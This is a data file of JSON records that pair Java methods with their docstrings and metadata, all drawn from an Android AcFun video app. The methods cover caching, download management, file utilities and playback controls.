{"docstring": "/**\n * \u7b80\u5355\u7684hash \u6563\u5217\u5b58\u50a8<br>\n * <b>NOTE:</b>\u8bf7\u5148\u8c03\u7528 {@link AcApp#isExternalStorageAvailable()} \u5224\u65ad\u662f\u5426\u53ef\u7528\n * @param type \u6587\u4ef6\u6839\u76ee\u5f55\u540d\n * @param fileUri \u6587\u4ef6 uri\n * @return \u7f13\u5b58\u6587\u4ef6\n */\n", "func_signal": "public static File generateCacheFile(String type, String fileUri)", "code": "{\n    int hashCode = fileUri.hashCode();\n    String folderName = String.format(\"%x\", hashCode & 0xf);\n    String fileName = String.format(\"%x\", hashCode >>> 4)+getUrlExt(fileUri);\n    File cache =new File(AcApp.getExternalCacheDir(type+\"/\"+folderName),fileName);\n    return cache;\n    \n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n *   \"/\" ~ \"?\"\u4e4b\u95f4\u7684\".xxx\"\n * @param url\n * @return defValue if not found ext\n */\n", "func_signal": "public static String getUrlExt(String url, String defValue)", "code": "{\n    \n    if (!TextUtils.isEmpty(url)) {\n        int start = url.lastIndexOf('/');\n        int end = url.lastIndexOf('?');\n        end = end <= start ? url.length() : end;\n        String ext = \"\";\n        if (start > 0 && start < url.length() - 1) {\n            try{\n            ext = url.substring(start, end).toLowerCase();\n            \n            return ext.substring(ext.lastIndexOf('.'));\n            }catch (StringIndexOutOfBoundsException e) {\n               Log.d(\"Util\", \"when get url ext : \"+url,e);\n            }\n        }\n        \n    }\n    return defValue;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * \n * @param sourceFile\n * @param destDir\n * @return\n */\n", "func_signal": "public static boolean copy(File sourceFile, String destDir)", "code": "{\n    if(!sourceFile.exists()) return false;\n    List<String> prog = new ArrayList<String>();\n    \n    prog.add(0,\"cp\");\n    if(sourceFile.isDirectory()){\n        prog.add(\"-R\"); \n    }\n    prog.add(sourceFile.getAbsolutePath());\n    prog.add(destDir);\n    String[] progArray = prog.toArray(new String[prog.size()]);\n    try {\n        Runtime.getRuntime().exec(progArray);\n        return true;\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n    return false;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * @param method\n * @param url\n * @param requestBody the form data to post,\n * @param clazz\n * @param listener\n * @param errorListner\n */\n", "func_signal": "public CustomUARequest(int method, String url, Map<String, String> requestBody,Class<T> clazz,Listener<T> listener,ErrorListener errorListner)", "code": "{\n    super(method, url, errorListner);\n    this.mClazz = clazz;\n    this.mListener = listener;\n    mPostBody = requestBody;\n}", "path": "libs\\LibAcfunUtil\\src\\tv\\acfun\\util\\net\\CustomUARequest.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "// @Override\n// public boolean onCreateOptionsMenu(Menu menu) {\n// menu.add(0,R.id.edit_query,0,\"\u7f16\u8f91\").setIcon(R.drawable.ic_menu_mark).setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);\n// return true;\n// }\n", "func_signal": "@Override\nprotected void onStart()", "code": "{\n    super.onStart();\n    mDownloadMan.registerDownloadObserver(this);\n    mAdapter.notifyDataSetChanged();\n}", "path": "acvideo\\src\\tv\\acfun\\video\\DownloadManActivity.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/*** \u683c\u5f0f\u5316\u6587\u4ef6\u5927\u5c0f(xxx.xx B/KB/MB/GB) */\n", "func_signal": "public static String formatFileSize(long size)", "code": "{\n    if(size <=0) return \"0B\";\n    DecimalFormat df = new DecimalFormat(\"#.00\");\n    String fileSizeString = \"\";\n    if (size < _1KB)\n        fileSizeString = df.format((double) size) + \"B\";\n    else if (size < _1MB)\n        fileSizeString = df.format((double) size / _1KB) + \"KB\";\n    else if (size < _1GB)\n        fileSizeString = df.format((double) size / _1MB) + \"MB\";\n    else\n        fileSizeString = df.format((double) size / _1GB) + \"GB\";\n\n    return fileSizeString;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * \u83b7\u5f97\u89c6\u9891\u6587\u4ef6\u4e0b\u8f7d\u8def\u5f84\uff0c\u9ed8\u8ba4\u4e3a/sdcard/Download/AcFun/videos/{aid}/{vid}\n * @return\n */\n", "func_signal": "public static File getDownloadPath(String aid, String vid)", "code": "{\n    File path = new File(sSharedPreferences.getString(\"download_path\", Environment.getExternalStorageDirectory().getAbsolutePath()+\"/Download/AcFun/Videos/\"+aid+\"/\"+vid));\n    if(!path.exists()) path.mkdirs();\n    return path;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\AcApp.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * @param type the http header, content-type\n * @return\n */\n", "func_signal": "public static String getMimeType(String type)", "code": "{\n    if (type == null) {\n        return null;\n    }\n\n    type = type.trim().toLowerCase(Locale.US);\n\n    final int semicolonIndex = type.indexOf(';');\n    if (semicolonIndex != -1) {\n        type = type.substring(0, semicolonIndex);\n    }\n    return type;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * mark job completed\n */\n", "func_signal": "public void complete(int status, DownloadJob job)", "code": "{\n    if(mCompletedJobs.contains(job))\n        return;\n    mQueuedJobs.remove(job);\n    mCompletedJobs.add(job);\n    if(status == 200){\n        job.getEntry().part.isDownloaded = true;\n    }\n    job.getEntry().part.isDownloading = false;\n//        \u7531task\u81ea\u5df1\u66f4\u65b0status\n//        for(VideoSegment s :job.getEntry().part.segments){\n//            setStatus(job.getEntry().part.vid, s.num, status);\n//        }\n    mDownloadManager.notifyAllObservers(2);\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\download\\DownloadProvider.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * \u83b7\u5f97\u7f13\u5b58\u76ee\u5f55 <br>\n * <b>NOTE:</b>\u8bf7\u5148\u8c03\u7528 {@link #isExternalStorageAvailable()} \u5224\u65ad\u662f\u5426\u53ef\u7528\n * \n * @param type\n *            {@link #IMAGE} {@link #VIDEO} and so on.\n * @return \n */\n", "func_signal": "public static File getExternalCacheDir(String type)", "code": "{\n    File cacheDir = new File(sContext.getExternalCacheDir(), type);\n    if(!cacheDir.isDirectory() && cacheDir.mkdirs())\n        cacheDir = new File(sContext.getCacheDir(),type);\n    return cacheDir;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\AcApp.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * Must set before {@link #setVideoURI}\n * \n * @param chroma\n */\n", "func_signal": "public void setVideoChroma(int chroma)", "code": "{\n    getHolder().setFormat(chroma == MediaPlayer.VIDEOCHROMA_RGB565 ? PixelFormat.RGB_565 : PixelFormat.RGBA_8888); // PixelFormat.RGB_565\n    mVideoChroma = chroma;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\player\\VideoView.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * \u5b57\u7b26 \u8f6c\u4e49\u5b57\u7b26\n *   \u201c &quot;\n *   & &amp; \n *   < &lt;\n *   > &gt;\n *     &nbsp;\n */\n", "func_signal": "public static String getSource(String escapedHtml)", "code": "{\n    if(escapedHtml == null) return \"\";\n    return escapedHtml.replaceAll(\"&quot;\", \"\\\"\").replaceAll(\"&amp;\", \"&\").replaceAll(\"&lt;\", \"<\")\n            .replaceAll(\"&gt;\", \">\").replaceAll(\"&nbsp;\", \" \");\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\TextViewUtils.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * Cancel download job and remove it from db\n * @param job\n */\n", "func_signal": "public void removeDownload(DownloadJob job)", "code": "{\n    if(DownloadManager.isRunningStatus(job.getStatus())){ \n        job.cancel();\n    }\n    mQueuedJobs.remove(job);\n    mCompletedJobs.remove(job);\n    \n    mDb.remove(job);\n    mDownloadManager.notifyAllObservers(2);\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\download\\DownloadProvider.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "// 500ms\u5237\u65b0\u4e00\u56de\uff0c\u4ee5\u514d\u8fc7\u5feb\u5237\u65b0\u5bfc\u81f4\u5d29\u6e83\n", "func_signal": "@Override\n   public void onDownloadChanged(int what)", "code": "{\n       // \u662f\u8fd9\u91cc\u5bfc\u81f4\u6ca1\u6709\u53ca\u65f6\u66f4\u65b0\u754c\u9762\u7684\u3002\n       switch (what) {\n       case DownloadManager.ON_PROGRESS: // \u5237\u65b0\u8fdb\u5ea6\uff0c\u624d\u63a7\u5236\u901f\u5ea6\n           if (System.currentTimeMillis() - lastUpdateTime > UPDATE_INTERVAL) {\n               runOnUiThread(mUpdateTask);\n               lastUpdateTime = System.currentTimeMillis();\n           }\n           break;\n       default:\n           runOnUiThread(mUpdateTask); // \u5176\u4ed6\u72b6\u6001\uff0c\u53ca\u65f6\u5237\u65b0\n           break;\n       }\n       \n   }", "path": "acvideo\\src\\tv\\acfun\\video\\DownloadManActivity.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * Show the controller on screen. It will go away automatically after\n * 'timeout' milliseconds of inactivity.\n *\n * @param timeout The timeout in milliseconds. Use 0 to show the controller\n *                until hide() is called.\n */\n", "func_signal": "public void show(int timeout)", "code": "{\n  if (!mShowing && mAnchor != null && mAnchor.getWindowToken() != null) {\n    if (mPauseButton != null)\n      mPauseButton.requestFocus();\n    showBar();\n    if (mFromXml) {\n      setVisibility(View.VISIBLE);\n    } else {\n\n      mWindow.setAnimationStyle(mAnimStyle);\n      mWindow.showAtLocation(mAnchor, Gravity.NO_GRAVITY, 0, 0);\n    }\n    mShowing = true;\n    if (mShownListener != null)\n      mShownListener.onShown();\n  }\n  updatePausePlay();\n  mHandler.sendEmptyMessage(SHOW_PROGRESS);\n\n  if (timeout != 0) {\n    mHandler.removeMessages(FADE_OUT);\n    mHandler.sendMessageDelayed(mHandler.obtainMessage(FADE_OUT), timeout);\n  }\n}", "path": "acvideo\\src\\tv\\acfun\\video\\player\\MediaController.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * @param manager the manager\n * @param aid ac id\n * @param vid video part id\n * @param snum segment num in video part\n * @param url segment download url\n * @param fileName segment file name,can be null\n * @param savePath can be null\n * @param userAgent can be null\n * @param totalBytes -1 means resolve content-length by task itself\n * @param etag can be null\n */\n", "func_signal": "public DownloadInfo(DownloadManager manager, String aid, String vid, int snum, String url, String savePath,\n        String fileName, String userAgent, int totalBytes, String etag)", "code": "{\n    this.manager = manager;\n    this.aid = aid;\n    this.vid = vid;\n    this.snum = snum;\n    this.url = url;\n    this.savePath = savePath;\n    this.fileName = fileName;\n    this.userAgent = userAgent;\n    this.totalBytes = totalBytes;\n    this.etag = etag;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\download\\DownloadInfo.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
{"docstring": "/**\n * \n * @param source folder\n * @param dest folder\n * @return\n */\n", "func_signal": "public static boolean move(String source, String dest)", "code": "{\n    File sourceFile = new File(source);\n    List<String> sourceArray = new ArrayList<String>();\n    sourceArray.add(0, \"mv\");\n    if(sourceFile.isDirectory()){\n        for(File file : sourceFile.listFiles()){\n            sourceArray.add(file.getAbsolutePath());\n        }\n    }else{\n        sourceArray.add(source);\n    }\n    new File(dest).mkdirs();\n    sourceArray.add(dest);\n    String[] arr = sourceArray.toArray(new String[sourceArray.size()]);\n    try {\n        Runtime.getRuntime().exec(arr);\n        return true;\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n    return false;\n}", "path": "acvideo\\src\\tv\\acfun\\video\\util\\FileUtil.java", "repo_name": "jovisayhehe/acfunm", "stars": 70, "license": "None", "language": "java", "size": 24538}
